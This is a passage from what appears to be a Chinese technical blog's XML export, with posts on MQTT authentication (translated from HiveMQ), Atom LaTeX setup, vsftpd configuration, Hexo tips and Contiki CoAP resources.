    <content type="text"><![CDATA[在上一篇文章中，我们已经解释了认证的基础知识，并且MQTT协议在CONNECT消息中提供用于认证的用户名和密码。此帖子将引入其他机制来验证客户端，以及如何在MQTT代理端上实现身份验证。 注：本文翻译自：MQTT Security Fundamentals: Authentication with Username and Password 使用其他信息认证 正如我们在上一篇文章中了解到的，认证是确认一方的身份的机制。我们已经看到如何通过使用用户名和密码组合来实现。除了用户名和密码外，MQTT客户端还提供可用于认证的附加信息。 客户端标识符 每个MQTT客户端都有唯一的客户端标识符该唯一标识符由客户端在MQTT CONNECT消息中提供。客户端ID最多可达65535个字符，以前限制为23个字符的MQTT 3.1.1规范无效。通常的做法是使用36个字符长的uuids或客户端可用的任何其他唯一信息，如网络模块的MAC地址或设备本身的序列号。在身份验证过程中，除了用户名和密码之外，常常使用客户端ID。确认客户端是否可以访问MQTT代理的常见示例是验证用户名/密码以及该凭证组合的正确客户端ID。虽然这不是一个很好的安全措施，但也可以忽略用户名/密码，并根据客户端标识符进行身份验证。对于封闭系统，这种认证可能就够了。 X.509证书 来自客户端的另一个可能的认证来源是一个X.509客户端证书，它将在TLS握手期间向代理提供（我们将在稍后的一篇文章中解释更多关于传输级安全性以及SSL/TLS如何与MQTT一起工作的方式）。像HiveMQ这样的代理可以在TLS握手已经成功后，使用证书中的信息进行应用层验证。这使得代理能够读取证书中包含的所有信息，并将其用于认证目的。如果您可以控制提供IoT设备，则X509客户端证书可能是对MQTT代理进行身份验证的非常好的来源。 使用HiveMQ实现认证 我们已经看到有可用于MQTT客户端认证的各种信息。现在是时候连接MQTT代理和身份验证存储，它可以是数据库，Web服务，LDAP目录或简单的ACL（访问控制列表）。看看如何在HiveMQ MQTT代理程序中实现认证逻辑。HiveMQ代理有一个开放源码的插件系统，它允许你挂钩在代理上的各种事件。HiveMQ具有不同的回调接口，它们在定制插件中非常容易实现。插件实现在运行时由代理调用。为了认证，HiveMQ提供OnAuthenticationCallback。 123456789public class AuthWithUsernamePasswordCallback implements OnAuthenticationCallback &#123; @Override public Boolean checkCredentials(ClientCredentialsData clientCredentialsData) throws AuthenticationException &#123; // Custom Authentication Logic &#125;&#125; 这种回调实现足以根据您的用例自定义身份验证机制。方法回调有一个参数，它是ClientCredentialsData类型的一个对象，它继承了ClientData类型。这包含HiveMQ从连接客户端可用的所有数据。它允许您检查客户端ID，用户名，密码和证书。如果客户端提供有效的认证信息，则此回调将返回true。为了拒绝认证，有两种可能性： return false throw an Exception 如果回调函数返回false，HiveMQ将看到是否有任何其他插件和请求身份验证。如果其中一个返回true，HiveMQ将接受客户端的身份验证。如果HiveMQ不应该考虑任何其他插件，并立即拒绝连接，则应抛出异常。使用异常时，也可以修改CONNACK返回码。我们有一个更普遍的例子，在GitHub上使用用户名/密码验证的虚拟实现。 在从HiveMQ提取回调之前，需要将其添加到回调注册表中。这可以很容易地在插件的主类中完成。主要的类是每个插件都需要的，可以很容易地识别，因为它是唯一扩展PluginEntryPoint的类。回调通过依赖注入注入并添加到回调注册表中。现在插件可以和HiveMQ代理一起使用。 123456789101112131415161718public class AuthenticationExampleMainClass extends PluginEntryPoint &#123; private final AuthWithUsernamePasswordCallback authWithUsernamePasswordCallback; @Inject public AuthenticationExampleMainClass(final AuthWithUsernamePasswordCallback authWithUsernamePasswordCallbackCallback) &#123; this.authWithUsernamePasswordCallback = authWithUsernamePasswordCallbackCallback; &#125; @PostConstruct public void postConstruct() &#123; CallbackRegistry callbackRegistry = getCallbackRegistry(); callbackRegistry.addCallback(authWithUsernamePasswordCallback); &#125;&#125; 可以使用HiveMQ（开放源代码）插件来验证我们的插件目录中的客户端，如ACL的文件验证插件。 如果您需要有关如何开发，运行和部署HiveMQ代理的自定义验证插件的更多信息，请阅读插件开发人员指南。 这也是MQTT安全基础知识认证部分的结尾。在下一篇文章中，我们将介绍使用MQTT的主题级别授权。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Atom Latex编辑器配置]]></title>
    <url>%2F2017%2F09%2F16%2FAtom-Latex%E7%BC%96%E8%BE%91%E5%99%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[将Atom配置成为强大的Latex编辑器。 安装Atom Atom是由GitHub打造更为先进的编辑器，支持Windows、Mac、Linux三大桌面平台，完全免费，并且已经在GitHub上开放了全部的源代码。 Atom高度的可定制性，让用户可以自行添加所需要的功能，打造自己最易用的代码编辑器。与其它主流代码编辑器相比，显得轻巧了许多。 官网下载地址：https://atom.io/ Atom Github地址：https://github.com/atom/atom 如果使用官网的Installer安装失败，可直接到Github下载压缩包，直接解压使用，无需安装。 下载地址：https://github.com/atom/atom/releases/tag/v1.20.0 安装texlive TeX Live是一个TeX发行版，它是一组程序的集合，主要作用就是将你写的TeX代码进行解析排版输出成PS或者pdf。“TeX发行版相对于TeX语言”大致可以理解为“C语言编译器(如GCC或Clang)相对于C语言”的关系； 下载地址：http://tug.org/texlive/acquire-netinstall.html 记住安装地址，后续需要用到！ 安装Latex编译插件 打开Atom，File -&gt; Settings -&gt; Install，搜索并安装Latex插件，然后配置插件。 配置Tex Path为texlive的安装路径，Engine为pdflatex，其他的默认即可，如下图： 注意： 我们可能会遇到与Atom官网连接故障的问题导致Atom插件安装失败，可采用手动安装的方式，在Atom中搜索到相关package，点击插件名到Atom Packages页面。 然后到该插件的Github仓库，使用git将其克隆到atom的packages文件夹，或者使用下载zip文件并解压的方式，最后用npm命令安装。 Windows下.atom文件夹在C盘Users对应的你的用户名的目录下。 注：需提前安装nodejs，安装node以后自动会安装npm，使用Git命令行工具进行下载，然后使用npm进行安装。 1234cd ~/.atom/packagesgit clone https://github.com/thomasjo/atom-latex.gitcd latexnpm install 然后重启Atom即可看到该插件已经成功安装。 安装语言高亮插件 搜索并安装language-latex插件，该插件还可以实现LaTeX命令的自动补全功能，具体使用方案请自行搜索。 安装PDF预览插件 搜索并安装pdf-view插件，安装以后，Latex编译后会调用此插件进行pdf预览。 编译预览 新建latex文件，后缀为tex，然后填写如下内容： 123456789101112131415161718\documentclass[UTF8]&#123;article&#125;\author &#123;Zhenyu Fan&#125;\title &#123;My First Latex document&#125;\usepackage&#123;ctex&#125;\usepackage&#123;amsmath&#125;\usepackage&#123;amssymb&#125;\begin&#123;document&#125;\maketitle\section&#123;First section&#125; \subsection&#123;First subsection&#125; \subsubsection&#123;First double subsection&#125; \paragraph&#123;Fist paragraph&#125; \subsection&#123;Second subsection&#125;心之所向，素履以往。\end&#123;document&#125; 点击Atom菜单栏Packages -&gt; Latex -&gt; Builde（快捷键Ctrl+Alt+B）进行编译，然后就可以看到右侧生成的pdf文件，修改之后只要再次编译就可以查看到修改之后的预览效果。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Latex</tag>
        <tag>Atom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu中ftp服务器安装与配置]]></title>
    <url>%2F2017%2F09%2F14%2FUbuntu%E4%B8%ADftp%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[最近需要用到ftp，所以在腾讯云服务器上搭建了一个ftp服务器，简单记录一下Ubuntu Server中ftp服务器的初步配置。 ftp服务器安装用apt-get工具安装vsftpd1$ sudo apt-get install vsftpd 检查FTP端口是否已经打开ftp默认情况下，命令端口是21，数据端口就是20 1$ netstat -tnl 或者直接在浏览器里输入“ftp://服务器IP” 启动vsftpd服务123$ service vsftpd start或$ /etc/init.d/vsftpd start 停止vsftpd服务123$ service vsftpd stop或$ /etc/init.d/vsftpd stop 重启vsftpd服务123$ service vsftpd restart或$ /etc/init.d/vsftpd restart 查看服务状态1$ sudo service vsftpd status ftp服务器配置配置文件 主配置文件：/etc/vsftp.conf 权限限制用户列表文件：/etc/vsftp.chroot_list 认证配置文件：/etc/pam.d/vsftpd 主配置文件 修改主配置文件 1$ sudo nano /etc/vsftpd.conf 123anonymous_enable=NO（是否允许匿名登陆）local_enable=YES（是否允许本地登陆）write_enable=YES（设置FTP可写） chroot：change root directory chroot_local_user： 是否将所有用户限制在主目录,YES为启用 NO禁用.(该项默认值是NO,即在安装vsftpd后不做配置的话，ftp用户是可以向上切换到要目录之外的) chroot_list_enable： 是否启动限制用户的名单 YES为启用 NO禁用(包括注释掉也为禁用) chroot_list_file=/etc/vsftpd/chroot_list： 是否限制在主目录下的用户名单，至于是限制名单还是排除名单，这取决于chroot_local_user的值。文件默认是并不存在，需要手动创建. 123chroot_local_user=YESchroot_list_enable=YESchroot_list_file=/etc/vsftpd.chroot_list 我是用的是全局禁止跳出主目录，使用chroot_list添加例外！即，chroot_local_user=YES，chroot_list_enable=YES 1pam_service_name=vsftpd（这里有可能会出现530的错误，导致ftp用户无法登录，与后面的认证配置文件有关） 530错误： 权限限制用户列表 修改权限限制用户列表文件 1$ sudo nano /etc/vsftpd.chroot_list 具体作用与chroot_local_user和chroot_list_enable的配置有关，参考上面的表格进行相应的添加或删除，一行对应一个用户。 认证配置文件 修改可访问用户列表文件， 1$ sudo nano /etc/vsftpd.chroot_list 12345678910# Standard behaviour for ftpd(8).auth required pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed# Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.# Standard pam includes@include common-account@include common-session@include common-auth#auth required pam_shells.so 在这里，注释掉最后一行可以避免530错误。 用户管理添加ftp用户 创建用户 1$ sudo useradd username Linux的useradd命令如下： 1useradd(选项)(参数) 选项参数如下： 12345678910111213-c&lt;备注&gt;：加上备注文字。备注文字会保存在passwd的备注栏位中；-d&lt;登入目录&gt;：指定用户登入时的启始目录-D：变更预设值；-e&lt;有效期限&gt;：指定帐号的有效期限；-f&lt;缓冲天数&gt;：指定在密码过期后多少天即关闭该帐号；-g&lt;群组&gt;：指定用户所属的群组；-G&lt;群组&gt;：指定用户所属的附加群组；-m：自动建立用户的登入目录；-M：不要自动建立用户的登入目录；-n：取消建立以用户名称为名的群组；-r：建立系统帐号；-s：指定用户登入后所使用的shell；-u：指定用户id。 设置用户口令 1$ sudo passwd username 然后输入两次密码即可。 删除ftp用户1$ sudo userdel username 卸载vsftpd1$ sudo apt-get remove --purge vsftpd –purge 选项表示彻底删除改软件和相关文件 无权限错误 使用cmd的ftp可以正常登录，但是使用windows的文件管理器登录到ftp服务器时报错的问题： 在主配置文件中添加： 1pasv_promiscuous=YES 此选项激活将关闭pasv的安全检查，关于ftp的port模式和pasv模式将在以后的博客中介绍。 500 OOPS错误 500 OOPS: vsftpd: refusing to run with writable root inside 在主配置文件中添加： 1allow_writeable_chroot=YES]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT的安全机制总结]]></title>
    <url>%2F2017%2F08%2F25%2F%E8%AF%91-MQTT%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[HiveMQ团队对MQTT安全方面的系列总结文章写得很不错，所以想要将其翻译整理一下。 HiveMQ 是一个企业级的 MQTT 代理，主要用于企业和新兴的机器到机器M2M通讯和内部传输，最大程度的满足可伸缩性、易管理和安全特性。提供免费的个人版。HiveMQ 提供了开源的插件开发包。 注：本文翻译自：MQTT Security Fundamentals Wrap-Up 在我们的超连接世界中，安全是一个非常重要的方面，从每个IoT应用程序的开始就应该考虑安全性。我们的MQTT安全基础系列的目标是讨论通过MQTT协议保护数据交换的几个概念。 对于没有跟随整个系列的每个人来说，这里是所有按顺序排列的文章： Introducing the MQTT Security Fundamentals Authentication with Username and Password Advanced Authentication Mechanisms Authorization TLS / SSL X509 Client Certificate Authentication OAuth 2.0 &amp; MQTT MQTT Payload Encryption MQTT Message Data Integrity Securing MQTT Systems 文章翻译目录： [译]MQTT安全基础知识介绍 [译]MQTT安全基础：使用用户名和密码进行身份验证 [译]MQTT安全基础：高级认证机制 [译]MQTT安全基础：授权 [译]MQTT安全基础：TLS / SSL [译]MQTT安全基础：X509客户端证书认证 [译]MQTT安全基础：OAuth 2.0和MQTT [译]MQTT安全基础：MQTT有效载荷加密 [译]MQTT安全基础 - MQTT消息数据完整性 [译]MQTT安全基础 - 保护MQTT系统 感谢并关注更多MQTT相关内容， HiveMQ团队]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT安全基础：使用用户名和密码进行身份验证]]></title>
    <url>%2F2017%2F08%2F24%2F%E8%AF%91-MQTT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%EF%BC%9A%E4%BD%BF%E7%94%A8%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%2F</url>
    <content type="text"><![CDATA[在上一篇文章中，我们介绍了MQTT中非常基本的安全。今天的文章将从MQTT中的认证开始，进一步详细介绍。 注：本文翻译自：MQTT Security Fundamentals: Authentication with Username and Password 认证是MQTT中传输层和应用层安全性的一部分。 在传输层上，TLS可以保证使用客户端证书的客户端到服务器的身份验证，并确保服务器向客户端验证服务器证书。在应用层上，MQTT协议提供用户名和密码用于验证。各种代理实现在上面添加了不同的机制。本文将概述一般认证，哪些功能内置于MQTT协议本身。下周我们将看看经纪人认证方式。 认证1认证是确认单个数据或实体的属性的真实性的行为。 据维基百科 这意味着认证用于验证个人、设备或应用程序是否具有他们声称拥有的身份。 呈现一个旅行中的简单例子给你。在你能够乘坐飞机之前，机场安检要求你的护照或身份证件。显示所请求的ID以认证身份。在这种情况下，您的护照证实您的身份和您的姓名。每个人都可以说出你的名字，但是只有你能够出示护照作为你身份的证明。 身份验证是我们每天使用的过程，甚至没有注意到。每次登录到您的计算机时，您提供用户名和密码。用户名是您的身份，密码输入会将您认证为合法拥有者。 MQTT认证用户名/密码 当涉及MQTT中的认证时，协议本身在CONNECT消息中提供用户名和密码字段。因此，客户端可以在连接到MQTT代理时发送用户名和密码（有关详细信息，请参阅MQTT Essential Part 3：建立MQTT连接） 用户名是一个UTF-8编码的字符串，密码是二进制数据，最大为65535个字节。在去年发布的新版3.1.1版本中，MQTT 3.1规范中密码为12个字符的非规范性建议被删除。该规范还指出，没有密码的用户名是可能的。只发送密码而没有用户名是不可以的。 当使用内置的用户名/密码认证时，MQTT代理将根据实现的认证机制（更多的是在下一篇文章中）来评估凭证，并返回以下返回码之一（所有返回码的完整列表可以在MQTT Essential Part 3：建立MQTT连接中找到）。 Return Code Return Code Response 0 Connection Accepted 4 Connection Refused, bad user name or password 5 Connection Refused, not authorized 在客户端设置用户名和密码时，将以明文形式发送给代理。这将允许攻击者窃听，并且是获取凭据的简单方式。确保用户名和密码完全安全传输的唯一方法是使用传输加密。 所以这是关于MQTT认证的第一部分，在下一篇文章中，我们将通过验证提供的用户名/密码是否有效或通过使用其他属性（如客户端标识符进行身份验证）来查看在代理端实现身份验证的不同选项。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT安全基础知识介绍]]></title>
    <url>%2F2017%2F08%2F23%2F%E8%AF%91-MQTT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[最近我们做了一个问卷调查，询问你认为我们应该在下面讨论的最重要的MQTT主题。如上周的文章中已经提到的，赢家是保护MQTT。所以今天我们将启动一个名为MQTT Security Fundamentals的新系列。我们希望您能像我们每周一样发现MQTT Security的新一部分一样兴奋。这个第一篇文章将作为即将到来的第一篇文章将更加普遍和介绍，这将进一步深入了解MQTT中不同安全领域的不足之处。好的，让我们开始吧。 注：本文翻译自：Introducing the MQTT Security Fundamentals 为什么物联网至关重要？ 在我们的数字和全球化世界中，安全性每天都很突出，如果您正在进行银行转账，网上购物或通过互联网访问个人资料，这并不重要。物联网的想法是连接每个对象，以使过程更有效率，以任何方式提供更多的舒适性或改善我们的工作和个人生活。但连接对象，如汽车，家庭，机器也暴露了许多敏感数据。例如家庭中所有人的位置。也许很高兴知道你的家庭成员是什么，但是与窃贼分享这些信息并不理想。有不同种类的数据，不适用于公众，应受到信息安全支柱的保护：机密性，完整性和可用性。还有另一个需要，当真实的机器或事物受到威胁时，攻击者可以对真实的人造成伤害。喜欢在驾驶或破坏机器时在车内远程启动休息。即使没有真正的人参与，因为我们都知道敏感数据的曝光可能会损害公司的声誉。所以随着越来越多的数据被收集，每天都有更多的设备在我们的生活中安全是一个至关重要的，比以往更重要的话题。 物联网中的安全挑战 对于安全是否应该实施应该是毫无疑问的，但是物联网却给安全带来了新的挑战。虽然安全性通常在高度安全和极好的可用性之间取得平衡，但它在物联网中更加有趣。IoT设备通常受计算能力和内存容量的限制。因此，使用加密算法是一项挑战，通常需要比微型设备更多的资源。另一个挑战是更新现场设备。通常只有不可靠的连接可用，并且安全关键的事情需要立即更新，这可能难以立即向所有设备推出。另外，为用户提供直观的安全的挑战比以往更为重要，因为用户的接受取决于易于安装和维护。尽管从一开始开发IoT应用程序时，安全性就应始终存在。 MQTT中的安全方法 所以在提供了一些上下文之后，我们来看看MQTT如何处理安全性。如果您想首先清理您的MQTT知识，请确保在阅读之前阅读 MQTT Essentials，我们将假设您已经知道协议的概念。 MQTT中的安全分为多层。每层防止不同类型的攻击。该协议的目标是为物联网提供一个非常轻便和易于使用的通信协议。所以这就是为什么在协议本身只有一些安全机制被明确规定。但是在所有常见的实现中，使用其他最先进的安全标准，如用于传输安全性的SSL/TLS。背后的想法是安全性很难，嵌入非标准安全机制并没有好处，而是建立在普遍接受的标准之上。所以在下面的不同层上只会简单地介绍一下，我们将为这个系列中的每一个指派职位。这只能作为高层次的概述和大局。 网络层 使用物理安全网络或VPN作为客户端和代理之间的任何通信的基础，是提供安全可信的连接的一种方式。这适用于网关应用，网关一方面连接到设备，另一方面通过VPN连接到代理。 传输层 当目标是在大多数情况下提供机密性，TLS/SSL被用于传输加密。当使用客户端证书认证时，它提供了一种安全可靠的方法，以确保没有人可以解读，甚至认证双方。我们还将详细介绍TLS在受限设备上的可行性。 应用层 在传输级别上，可以确保通信被加密，并且身份被认证。MQTT协议提供客户端标识符和用户名/密码凭据，也可用于在应用层对设备进行身份验证。这些属性由协议本身提供。当涉及授权或每个设备被允许做什么的时候，它代表了代理实现，如何处理它。另一种可能性是在应用层上使用有效负载加密，以便即使没有完全成熟的传输加密，也能使传输的信息安全。 系列的范围 所以这已经是一个很简单的概述，我们将在接下来的10个星期内讨论什么。我们的目标是讨论MQTT中的所有主要安全支柱和最佳实践。我们没有希望在同一个细节层面上涵盖所有主题。但要专注于最常用的并显示实用的例子。另一个主题将是对MQTT解决方案的潜在攻击以及如何从一开始就防止这些问题。如前所述，我们还将介绍如何使可用的安全机制适应受约束的设备。MQTT提供了很多选项，使其完全安全，但仍然没有高招，安全性要求往往取决于用例。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Pages + Hexo搭建博客（四）]]></title>
    <url>%2F2017%2F08%2F10%2FGithub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Hexo的前三篇博客已经能够完整地搭建博客，此篇博客主要介绍了自己在使用Hexo期间遇到的一些问题以及解决问题的工具。 博客备份工具 一直想着怎么把博客备份一下，以便丢失时或者是换电脑时能够接着写博客，终于找到一个靠谱的插件，直接将文件备份在博客的仓库中的不同分支，十分方便。 项目地址：https://github.com/coneycode/hexo-git-backup 安装 如果hexo的版本是2.x.x则执行如下命令: 1$ npm install hexo-git-backup@0.0.91 --save 如果hexo的版本是3.x.x, 则执行: 1$ npm install hexo-git-backup --save 配置 在站点配置文件_config.yml中添加如下信息： 12345backup: type: git # 指定提交类型 message: update xxx # 添加git commit信息 repository: # 指定仓库类型和地址 github: git@github.com:xxx/xxx.git,分支名字 运行 使用 1hexo backup 或者 1hexo b 备份成功后，可以在Github上查看我们新建的备份分支。 使用Latex数学公式 Hexo默认使用”hexo-renderer-marked”引擎渲染网页，该引擎会把一些特殊的markdown符号转换为相应的html标签，比如在markdown语法中，下划线’_’代表斜体，会被渲染引擎处理为标签。 因为类Latex格式书写的数学公式下划线 ‘_’ 表示下标，有特殊的含义，如果被强制转换为标签，那么MathJax引擎在渲染数学公式的时候就会出错。例如，$x_i$在开始被渲染的时候，处理为$xi$，这样MathJax引擎就认为该公式有语法错误，因为不会渲染。 类似的语义冲突的符号还包括’*’, ‘{‘, ‘}’, ‘\’等。 进入到主题目录，找到_config.yml配置问题，把mathjax默认的false修改为true，具体如下： 1234# MathJax Supportmathjax: enable: true per_page: true 此外，还需要在文章的Front-matter里打开mathjax开关，如下： 123456---title: index.htmldate: 2017-03-28 21:01:30tags:mathjax: true-- 插入图片 前面说过使用七牛云进行图片存储，其实也可以直接使用我们的Hexo github仓库进行图片存储。 方法一：在hexo/source目录下新建一个img文件夹，将图片放入该文件夹下，插入图片时链接即为/img/图片名称 方法二：直接将图片放在public目录下对应的博客文章的目录下。 1![你想输入的替代文字](xxxx/图片名.jpg) 但是，这样做也存在一定的缺点，因为Github仓库的的大小也是受限的，所以图片太多就比较麻烦了，所以还是建议用图床等其他云存储方式。 插入音乐 网音乐云音乐，虾米音乐都可以生成内嵌音乐的html代码，在其网页端找到喜欢的歌曲，点击分享按钮，把里面的代码复制下来，直接粘贴到博文中即可: 123&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=330 height=86 src=&quot;http://music.163.com/outchain/player?type=2&amp;id=450853439&amp;auto=1&amp;height=66&quot;&gt; &lt;/iframe&gt; 插入视频 将优酷等视频平台提供的视频外链或者自己制作的视频外链替换掉如下src的值即可。 12345&lt;iframe height=498 width=510 src=&quot;http://player.youku.com/embed/XNjcyMDU4Njg0&quot; frameborder=0 allowfullscreen&gt; &lt;/iframe&gt; 百度/google收录你的站点安装sitemap插件12npm install hexo-generator-sitemap --save # googlenpm install hexo-generator-baidu-sitemap --save # 百度 在站点配置文件_config.yml中添加如下代码： 12345# 自动生成sitemapsitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xml 执行hexo -g后会在public目录下生成baidusitmap.xml 和 sitemap.xml两个文件。 Hexo 3.xx版本的问题 Hexo 3.0 把服务器独立成了个别模块，您必须先安装 hexo-server 才能使用。 1$ npm install hexo-server --save 安装完成后，输入以下命令以启动服务器，您的网站会在 http://localhost:4000 下启动。在服务器启动期间，Hexo 会监视文件变动并自动更新，您无须重启服务器。 然后，通过如下命令可开启本地预览： 1$ hexo server 或者 1hexo s 如果您想要更改端口，或是在执行时遇到了 EADDRINUSE 错误，可以在执行时使用 -p 选项指定其他端口，如下： 1$ hexo server -p 5000]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki中CoAP协议实现（上）]]></title>
    <url>%2F2017%2F07%2F16%2FContiki%E4%B8%ADCoAP%E5%8D%8F%E8%AE%AE%E5%AE%9E%E7%8E%B0%EF%BC%88%E4%B8%8A%EF%BC%89%2F</url>
    <content type="text"><![CDATA[CoAP(Constrained Application Protocol)协议是为物联网中资源受限设备制定的应用层协议。 CoAP协议简介 CoAP(Constrained Application Protocol)协议是为物联网中资源受限设备制定的应用层协议。CoAP旨在轻松转换为HTTP，以简化与Web的集成，同时满足组播支持，非常低的开销和简单性等特殊要求。 CoAP可以在大多数支持UDP的设备上运行。CoAP使用两种消息类型，请求和响应，使用简单的二进制基本头文件格式。基本标题后面可以是优化的类型长度值格式的选项。默认情况下，CoAP绑定到UDP，并可选择为DTLS（数据报传输层安全），提供高水平的通信安全性。 逻辑上分为Message和Request/Response两层（如下图），Request/Response通过Message承载，从封包上不体现这种层次结构。 REST REST(Representational State Transfer，表述性状态转移)依赖于无状态的、客户机-服务器，可缓存的通信协议。 RESTful Web服务的关键抽象就是资源而不是服务。一般来说，传感器，执行器和控制系统可以优雅地表现为通过RESTful Web服务暴露的资源及其服务。 RESTful应用程序使用类似HTTP的请求来发布数据（创建和/或更新），读取数据（例如查询）和删除数据。因此，REST对所有四个CRUD（创建/读取/更新/删除）操作都使用HTTP。 CoAP API Contiki的CoAP实现基于Erbium（Er），一种低功耗的Contiki的REST引擎。 REST引擎包括一个全面的嵌入式CoAP实现，成为Contiki中的官方。 CRU(create, read, update, delete)操作： POST: Create a resource GET: Retrieve a resource PUT: Update a resource DELETE: Delete a resource 服务器上有各种可用的资源。服务器上的每个资源都有一个处理函数，REST层调用它来为客户端的请求提供服务。REST服务器将请求的内容发送回客户端。 RESTful资源定义1234567891011121314151617/* data structure representing a resource in REST */struct resource_s &#123; struct resource_s *next; /* for LIST, points to next resource defined */ const char *url; /*handled URL */ rest_resource_flags_t flags; /* handled RESTful methods */ const char *attributes; /* link-format attributes */ restful_handler get_handler; /* handler function */ restful_handler post_handler; /* handler function */ restful_handler put_handler; /* handler function */ restful_handler delete_handler; /* handler function */ union &#123; struct periodic_resource_s *periodic; /* special data depending on flags */ restful_trigger_handler trigger; restful_trigger_handler resume; &#125;;&#125;;typedef struct resource_s resource_t; 五种RESTful资源类型 RESOURCE normal resource，由与资源处理函数相关联的静态Uri-Path定义。这是所有其他资源类型的基础。 12#define RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler) \ resource_t name = &#123; NULL, NULL, NO_FLAGS, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; NULL &#125; &#125; PARENT_RESOURCE parent resource，通过评估可能长于父资源的Uri-Path来管理多个子资源。 12#define PARENT_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler) \ resource_t name = &#123; NULL, NULL, HAS_SUB_RESOURCES, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; NULL &#125; &#125; SEPARATE_RESOURCE separate resource，如果服务器不能立即响应CON请求，它只需用空的ACK消息进行响应，以便客户端可以停止重新发送请求。过了一会儿，当服务器准备好响应时，它将响应作为CON消息发送。以下宏允许创建具有单独响应的CoAP资源： 12#define SEPARATE_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler, resume_handler) \ resource_t name = &#123; NULL, NULL, IS_SEPARATE, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; .resume = resume_handler &#125; &#125; EVENT_RESOURCE event resource，事件资源类似于周期性资源，但第二个处理程序是由非周期性事件调用的，例如按下一个按钮。 12#define EVENT_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler, event_handler) \ resource_t name = &#123; NULL, NULL, IS_OBSERVABLE, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; .trigger = event_handler &#125; &#125; 如果我们需要声明一个定期的资源，例如轮询传感器并发布更改的值给订阅的客户端，那么我们应该使用： 12345678910/* * Macro to define a periodic resource. * The corresponding [name]_periodic_handler() function will be called every period. * For instance polling a sensor and publishing a changed value to subscribed clients would be done there. * The subscriber list will be maintained by the final_handler rest_subscription_handler() (see rest-mapping header file). */#define PERIODIC_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler, period, periodic_handler) \ periodic_resource_t periodic_##name; \ resource_t name = &#123; NULL, NULL, IS_OBSERVABLE | IS_PERIODIC, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; .periodic = &amp;periodic_##name &#125; &#125;; \ periodic_resource_t periodic_##name = &#123; NULL, &amp;name, period, &#123; &#123; 0 &#125; &#125;, periodic_handler &#125;; 请注意，PERIODIC_RESOURCE和EVENT_RESOURCE可以被观察到，这意味着可以向客户端通知给定资源中的任何更改。 初始化 初始化REST框架并启动HTTP或CoAP进程 1234/** * \brief Initializes REST framework and starts the HTTP or CoAP process. */void rest_init_engine(void); 激活资源 然后对于每个声明的资源，我们想要访问 123456789/** * * \brief Resources wanted to be accessible should be activated with the following code. * \param resource * A RESTful resource defined through the RESOURCE macros. * \param path * The local URI path where to provide the resource. */void rest_activate_resource(resource_t *resource, char *path); 例如： 定义资源： 123456RESOURCE(res_hello, &quot;title=\&quot;Hello world: ?len=0..\&quot;;rt=\&quot;Text\&quot;&quot;, res_get_handler, NULL, NULL, NULL); 激活资源： 1rest_activate_resource(&amp;res_hello, &quot;test/hello&quot;); 访问资源： 资源的URI路径为：test/hello 获取可用资源列表12345/** * \brief Returns the list of registered RESTful resources. * \return The resource list. */list_t rest_get_resources(void); 强制性CoAP端口是5683]]></content>
      <categories>
        <category>IoT</category>
        <category>CoAP</category>
      </categories>
      <tags>
        <tag>6LoWPAN</tag>
        <tag>CoAP</tag>
        <tag>Contiki</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki中MQTT协议实现（上）]]></title>
    <url>%2F2017%2F06%2F30%2FContiki%E4%B8%ADMQTT%E5%8D%8F%E8%AE%AE%E5%AE%9E%E7%8E%B0%EF%BC%88%E4%B8%8A%EF%BC%89%2F</url>
